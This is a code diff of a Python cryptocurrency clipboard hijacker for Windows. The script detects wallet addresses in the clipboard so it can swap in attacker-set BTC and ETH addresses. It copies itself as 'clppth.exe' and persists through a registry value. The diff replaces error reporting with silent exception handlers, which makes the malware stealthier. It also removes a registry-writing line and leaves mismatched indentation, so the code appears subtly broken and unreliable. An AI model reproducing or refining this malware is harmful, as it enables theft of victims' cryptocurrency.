@@ -3,8 +3,8 @@ import winreg
 import shutil
 import time
 import re
-import os
 import sys
+import os
 
 btcaddr = "SET BTC ADDRESS HERE"  # if no BTC address leave as SET BTC ADDRESS HERE
 ethaddr = "SET ETH ADDRESS HERE"  # if no ETH address leave as SET ETH ADDRESS HERE
@@ -30,9 +30,8 @@ def is_crypto_addr(clipboard_text):
             return "XMR"
         else:
             return False
-    except Exception as e:
-        print(f"Error in is_crypto_addr: {e}")
-        return False
+    except:
+        pass
 
 def main():
     try:
@@ -80,10 +79,10 @@ def main():
                     pass
             else:
                 pass
-        except Exception as e:
-            print(f"Error in main: {e}")
-    except Exception as e:
-        print(f"Error in main outer: {e}")
+        except:
+            pass
+    except:
+        pass
 
     time.sleep(0.15)
 
@@ -96,9 +95,8 @@ def dupe_self():
         duplicate_script = os.path.join(duplicate_directory, "clppth.exe")
         shutil.copyfile(current_script, duplicate_script)
         return duplicate_script
-    except Exception as e:
-        print(f"Error in dupe_self: {e}")
-        return None
+    except:
+        pass
 
 def add_reg(dupe_path):
     try:
@@ -107,10 +105,10 @@ def add_reg(dupe_path):
         with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
             try:
                 winreg.QueryValueEx(reg_key, "CLPPTH")
-            except FileNotFoundError:
-                winreg.SetValueEx(reg_key, "CLPPTH", 0, winreg.REG_SZ, dupe_path)
-    except Exception as e:
-        print(f"Error in add_reg: {e}")
+            except:
+                pass
+   except:
+        pass
 
 def check():
     try:
@@ -134,12 +132,12 @@ def check():
                         main()
                 else:
                     pass
-    except Exception as e:
-        print(f"Error in check: {e}")
+    except:
+        pass
 
 if __name__ == "__main__":
     try:
         if os.name == "nt":
             check()
-    except Exception as e:
-        print(f"Error in main outermost: {e}")
+    except:
+        pass
